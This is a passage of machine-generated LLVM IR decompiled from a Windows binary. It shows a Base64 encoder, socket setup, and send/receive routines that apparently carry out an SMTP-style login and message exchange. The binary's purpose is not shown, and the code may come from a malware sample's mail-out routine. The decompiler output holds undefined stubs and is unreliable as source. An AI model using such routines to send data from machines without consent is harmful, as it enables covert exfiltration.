  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !861
  br label %dec_label_pc_40543e, !insn.addr !861

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !864
  %25 = add i32 %24, 3, !insn.addr !865
  %26 = load i32, i32* %3, align 4, !insn.addr !862
  %27 = icmp sgt i32 %25, %26, !insn.addr !866
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !866

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !867
  %29 = inttoptr i32 %28 to i8*, !insn.addr !867
  %30 = load i8, i8* %29, align 1, !insn.addr !867
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !868
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !869
  %34 = inttoptr i32 %33 to i8*, !insn.addr !869
  %35 = load i8, i8* %34, align 1, !insn.addr !869
  store i8 %35, i8* %5, align 1, !insn.addr !870
  %36 = load i8, i8* %29, align 1, !insn.addr !871
  %37 = mul i8 %36, 16, !insn.addr !872
  %38 = and i8 %37, 48, !insn.addr !873
  %39 = add i32 %28, 1, !insn.addr !874
  %40 = inttoptr i32 %39 to i8*, !insn.addr !874
  %41 = load i8, i8* %40, align 1, !insn.addr !874
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !875
  %44 = zext i8 %43 to i32, !insn.addr !875
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !876
  %46 = inttoptr i32 %45 to i8*, !insn.addr !876
  %47 = load i8, i8* %46, align 1, !insn.addr !876
  store i8 %47, i8* %7, align 1, !insn.addr !877
  %48 = load i8, i8* %40, align 1, !insn.addr !878
  %49 = mul i8 %48, 4, !insn.addr !879
  %50 = and i8 %49, 60, !insn.addr !880
  %51 = add i32 %28, 2, !insn.addr !881
  %52 = inttoptr i32 %51 to i8*, !insn.addr !881
  %53 = load i8, i8* %52, align 1, !insn.addr !881
  %54 = udiv i8 %53, 64, !insn.addr !882
  %55 = or i8 %54, %50, !insn.addr !883
  %56 = zext i8 %55 to i32, !insn.addr !883
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !884
  %58 = inttoptr i32 %57 to i8*, !insn.addr !884
  %59 = load i8, i8* %58, align 1, !insn.addr !884
  store i8 %59, i8* %9, align 1, !insn.addr !885
  %60 = and i8 %53, 63, !insn.addr !886
  %61 = zext i8 %60 to i32, !insn.addr !886
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !887
  %63 = inttoptr i32 %62 to i8*, !insn.addr !887
  %64 = load i8, i8* %63, align 1, !insn.addr !887
  store i8 %64, i8* %11, align 1, !insn.addr !888
  br label %dec_label_pc_405589, !insn.addr !889

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !890
  %66 = icmp sgt i32 %65, %26, !insn.addr !891
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !891

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !892
  %77 = and i8 %76, 48, !insn.addr !893
  %78 = add i32 %67, 1, !insn.addr !894
  %79 = inttoptr i32 %78 to i8*, !insn.addr !894
  %80 = load i8, i8* %79, align 1, !insn.addr !894
  %81 = zext i8 %80 to i32, !insn.addr !894
  %82 = udiv i8 %80, 16, !insn.addr !895
  %83 = or i8 %82, %77, !insn.addr !896
  %84 = zext i8 %83 to i32, !insn.addr !896
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !897
  %86 = inttoptr i32 %85 to i8*, !insn.addr !897
  %87 = load i8, i8* %86, align 1, !insn.addr !897
  store i8 %87, i8* %7, align 1, !insn.addr !898
  %88 = mul i32 %81, 4, !insn.addr !899
  %89 = and i32 %88, 60, !insn.addr !900
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !901
  %91 = inttoptr i32 %90 to i8*, !insn.addr !901
  %92 = load i8, i8* %91, align 4, !insn.addr !901
  store i8 %92, i8* %9, align 1, !insn.addr !902
  store i8 61, i8* %11, align 1, !insn.addr !903
  br label %dec_label_pc_405589, !insn.addr !904

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !905
  %94 = mul i32 %93, 16, !insn.addr !906
  %95 = and i32 %94, 48, !insn.addr !907
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !908
  %97 = inttoptr i32 %96 to i8*, !insn.addr !908
  %98 = load i8, i8* %97, align 16, !insn.addr !908
  store i8 %98, i8* %7, align 1, !insn.addr !909
  store i8 61, i8* %9, align 1, !insn.addr !910
  store i8 61, i8* %11, align 1, !insn.addr !911
  br label %dec_label_pc_405589, !insn.addr !911

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !863
  %100 = inttoptr i32 %99 to i32*, !insn.addr !912
  %101 = load i32, i32* %100, align 4, !insn.addr !912
  %102 = add i32 %esp.0.reload, -4, !insn.addr !912
  %103 = inttoptr i32 %102 to i32*, !insn.addr !912
  store i32 %101, i32* %103, align 4, !insn.addr !912
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !913
  %105 = load i32, i32* %15, align 4, !insn.addr !914
  %106 = add i32 %esp.0.reload, -8, !insn.addr !914
  %107 = inttoptr i32 %106 to i32*, !insn.addr !914
  store i32 %105, i32* %107, align 4, !insn.addr !914
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !915
  %109 = load i32, i32* %17, align 4, !insn.addr !916
  %110 = add i32 %esp.0.reload, -12, !insn.addr !916
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !916
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !917
  %113 = load i32, i32* %19, align 4, !insn.addr !918
  %114 = add i32 %esp.0.reload, -16, !insn.addr !918
  %115 = inttoptr i32 %114 to i32*, !insn.addr !918
  store i32 %113, i32* %115, align 4, !insn.addr !918
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !919
  %117 = load i32, i32* %21, align 4, !insn.addr !920
  %118 = add i32 %esp.0.reload, -20, !insn.addr !920
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !920
  %120 = call i32 @"@LStrCatN"(), !insn.addr !921
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !922
  %122 = load i32, i32* %23, align 4, !insn.addr !923
  %123 = add i32 %122, -1, !insn.addr !923
  %124 = icmp eq i32 %123, 0, !insn.addr !923
  store i32 %123, i32* %23, align 4, !insn.addr !923
  %125 = icmp eq i1 %124, false, !insn.addr !924
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !924
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !924
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !924

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !925
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !926
  store i32 4216319, i32* %111, align 4, !insn.addr !927
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !928
  ret i32 %127, !insn.addr !929
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !930
  ret i32 %0, !insn.addr !930
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !931
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !932
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !933
  %0 = call i32 @function_4036c8(), !insn.addr !934
  %1 = inttoptr i32 %0 to i8*, !insn.addr !935
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !936
  %3 = call i32 @"@FillChar"(), !insn.addr !937
  %4 = icmp eq %hostent* %2, null, !insn.addr !938
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !939

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !936
  %6 = add i32 %5, 12, !insn.addr !940
  %7 = inttoptr i32 %6 to i32*, !insn.addr !940
  %8 = load i32, i32* %7, align 4, !insn.addr !940
  %9 = inttoptr i32 %8 to i32*, !insn.addr !941
  %10 = load i32, i32* %9, align 4, !insn.addr !941
  %11 = inttoptr i32 %10 to i8*, !insn.addr !942
  %12 = load i8, i8* %11, align 1, !insn.addr !942
  %13 = sext i8 %12 to i32, !insn.addr !943
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !944
  br label %dec_label_pc_405653, !insn.addr !944

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !945
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !946
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !947
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !948
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !948
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !948
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !949
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !950
  %5 = trunc i32 %4 to i16, !insn.addr !950
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !951
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !952
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !952
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !953
  %9 = icmp eq i32 %8, -1, !insn.addr !954
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !955
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !955

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !956
  %11 = trunc i32 %10 to i16, !insn.addr !957
  %12 = call i16 @htons(i16 %11), !insn.addr !957
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !958
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !958
  %14 = sext i16 %12 to i32, !insn.addr !959
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !959
  %16 = icmp eq i32 %15, 0, !insn.addr !960
  %17 = icmp eq i1 %16, false, !insn.addr !961
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !961
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !961

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !962
  store i32 %8, i32* %18, align 4, !insn.addr !962
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !963
  br label %dec_label_pc_4056f2, !insn.addr !963

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !964
  %20 = load i32, i32* %19, align 4, !insn.addr !964
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !965
  %21 = add i32 %esp.0.reload, 8, !insn.addr !966
  %22 = inttoptr i32 %21 to i32*, !insn.addr !966
  store i32 4216591, i32* %22, align 4, !insn.addr !966
  %23 = call i32 @"@LStrClr"(), !insn.addr !967
  ret i32 %23, !insn.addr !968
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !969
  ret i32 %0, !insn.addr !969
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !970
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !971
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !972
  %2 = call i32 @WSACleanup(), !insn.addr !973
  ret i32 %2, !insn.addr !974
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !975
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !976
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !976
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !976
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !977
  %4 = call i32 @function_4036c8(), !insn.addr !978
  %5 = call i32 @StrCopy(), !insn.addr !979
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !980
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !981
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !982
  %9 = call i32 @"@LStrClr"(), !insn.addr !983
  ret i32 %9, !insn.addr !984
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !985
  ret i32 %0, !insn.addr !985
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !986
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !987
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !988
  %2 = call i32 @StrPas(), !insn.addr !989
  ret i32 %2, !insn.addr !990
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !991
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !991
  %esp.0.reg2mem = alloca i32, !insn.addr !991
  %ecx.0.reg2mem = alloca i32, !insn.addr !991
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !992
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !993
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !993
  br label %dec_label_pc_4057d9, !insn.addr !993

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !994
  %2 = inttoptr i32 %1 to i32*, !insn.addr !994
  store i32 0, i32* %2, align 4, !insn.addr !994
  %3 = add i32 %esp.0.reload, -8, !insn.addr !995
  %4 = inttoptr i32 %3 to i32*, !insn.addr !995
  store i32 0, i32* %4, align 4, !insn.addr !995
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !996
  %6 = icmp eq i32 %5, 0, !insn.addr !996
  %7 = icmp eq i1 %6, false, !insn.addr !997
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !997
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !997
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !997

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !998
  %9 = inttoptr i32 %8 to i32*, !insn.addr !998
  store i32 0, i32* %9, align 4, !insn.addr !998
  %10 = call i32 @function_4036b8(), !insn.addr !999
  %11 = call i32 @function_4036b8(), !insn.addr !1000
  %12 = call i32 @function_4036b8(), !insn.addr !1001
  %13 = call i32 @function_4036b8(), !insn.addr !1002
  %14 = call i32 @function_4036b8(), !insn.addr !1003
  %15 = call i32 @function_4036b8(), !insn.addr !1004
  %16 = call i32 @function_4036b8(), !insn.addr !1005
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1006
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1006
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1006
  store i32 %19, i32* %18, align 4, !insn.addr !1006
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1007
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1007
  store i32 4217413, i32* %21, align 4, !insn.addr !1007
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1008
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1008
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1008
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1009
  %25 = call i32 @function_405664(), !insn.addr !1010
  %26 = icmp eq i32 %25, 0, !insn.addr !1011
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1012
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1012
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !1012

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1013
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1013
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !1013
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1014
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1014
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1015
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1015
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !1015
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1016
  %34 = call i32 @function_405724(), !insn.addr !1017
  %35 = call i32 @function_4057a4(), !insn.addr !1018
  %36 = call i32 @function_405724(), !insn.addr !1019
  %37 = call i32 @function_4057a4(), !insn.addr !1020
  %38 = call i32 @"@LStrCat"(), !insn.addr !1021
  %39 = call i32 @function_405724(), !insn.addr !1022
  %40 = call i32 @function_4057a4(), !insn.addr !1023
  %41 = call i32 @"@LStrCat"(), !insn.addr !1024
  %42 = call i32 @function_405724(), !insn.addr !1025
  %43 = call i32 @function_4057a4(), !insn.addr !1026
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1027
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1027
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1027
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1028
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1028
  store i32 %arg1, i32* %47, align 4, !insn.addr !1028
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1029
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1029
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1029
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1030
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1030
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1030
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1031
  %53 = call i32 @function_405724(), !insn.addr !1032
  %54 = call i32 @function_4057a4(), !insn.addr !1033
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1034
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1034
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1034
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1035
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1035
  store i32 %arg2, i32* %58, align 4, !insn.addr !1035
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1036
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1036
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1036
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1037
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1037
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1037
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1038
  %64 = call i32 @function_405724(), !insn.addr !1039
  %65 = call i32 @function_4057a4(), !insn.addr !1040
  %66 = call i32 @function_405724(), !insn.addr !1041
  %67 = call i32 @function_4057a4(), !insn.addr !1042
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1043
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1043
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1043
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1044
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1044
  store i32 %arg1, i32* %71, align 4, !insn.addr !1044
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1045
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1045
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1045
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1046
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1046
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1046
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1047
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1047
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1047
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1048
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1048
  store i32 %arg2, i32* %79, align 4, !insn.addr !1048
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1049
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1049
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1049
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1050
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1050
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1050
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1051
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1051
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1051
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1052
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1052
  store i32 %arg3, i32* %87, align 4, !insn.addr !1052
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1053
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1053
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1053
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1054
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1054
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1054
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1055
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1055
  store i32 %arg4, i32* %93, align 4, !insn.addr !1055
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1056
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1056
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1056
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1057
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1057
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1057
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1058
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1058
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1059
  %101 = call i32 @function_405724(), !insn.addr !1060
  %102 = call i32 @function_4057a4(), !insn.addr !1061
  %103 = call i32 @function_405724(), !insn.addr !1062
  %104 = call i32 @function_4057a4(), !insn.addr !1063
  %105 = call i32 @function_405718(), !insn.addr !1064
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1065
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1065
  br label %dec_label_pc_405a10, !insn.addr !1065

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1066
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1066
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1067
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1068
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1069
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1069
  store i32 4217420, i32* %110, align 4, !insn.addr !1069
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1070
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1071
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1072
  ret i32 %113, !insn.addr !1073
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1074
  ret i32 %0, !insn.addr !1074
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1075
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1076
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1077
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1077
  store i32 %3, i32* %4, align 4, !insn.addr !1077
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1078
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1078
  %9 = add i8 %6, %8, !insn.addr !1078
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1078
  store i8 %9, i8* %10, align 1, !insn.addr !1078
  %11 = add i32 %2, 85, !insn.addr !1079
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1079
  %13 = load i8, i8* %12, align 1, !insn.addr !1079
  %14 = trunc i32 %1 to i8, !insn.addr !1079
  %15 = add i8 %13, %14, !insn.addr !1079
  store i8 %15, i8* %12, align 1, !insn.addr !1079
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1080
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1080
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1080
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1081
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1082
